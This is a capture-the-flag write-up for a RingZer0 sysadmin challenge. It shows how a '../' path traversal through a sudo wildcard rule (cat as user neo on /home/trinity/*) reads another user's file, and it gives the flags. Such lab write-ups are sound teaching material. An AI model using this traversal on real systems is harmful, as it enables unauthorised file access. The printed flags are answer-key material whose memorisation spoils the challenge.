# SysAdmin part 6

__PROBLEM__

Find Neo password

User: trinity
Password: FLAG for the Level 1

ssh trinity@challenges.ringzer0team.com -p 10090

__SOLUTION__

Password: `Flag-7e0cfcf090a2fe53c97ea3edd3883d0d`

So this one was pretty confusing for me. After trying all the previously tried ticks I almost gave up but then I finally got it.

Right after you log in and `ls` you find a `phonebook`.

```bash
The Oracle        1800-133-7133
Persephone        345-555-1244


copy made by Cypher copy utility on /home/neo/phonebook
```
Now we see that `cypher` made a copy of that phonebook if we can `cat` that link we may find something. But we need `sudo` for that

```bash
trinity@lxc-sysadmin:~$ sudo -l
Matching Defaults entries for trinity on lxc-sysadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User trinity may run the following commands on lxc-sysadmin:
    (neo) /bin/cat /home/trinity/*
```
See the last line it basically means that `neo` can `cat` all trinity stuff.  So we use that to get into `neo` directory and cat the phonebook.

```bash
trinity@lxc-sysadmin:~$ sudo -u neo /bin/cat /home/trinity/../neo/phonebook
The Oracle        1800-133-7133
Persephone        345-555-1244




change my current password FLAG-314df4d411ae37f16f590f65da99f3b6
don't forget to remove this :)
```

FLAG - `FLAG-314df4d411ae37f16f590f65da99f3b6`
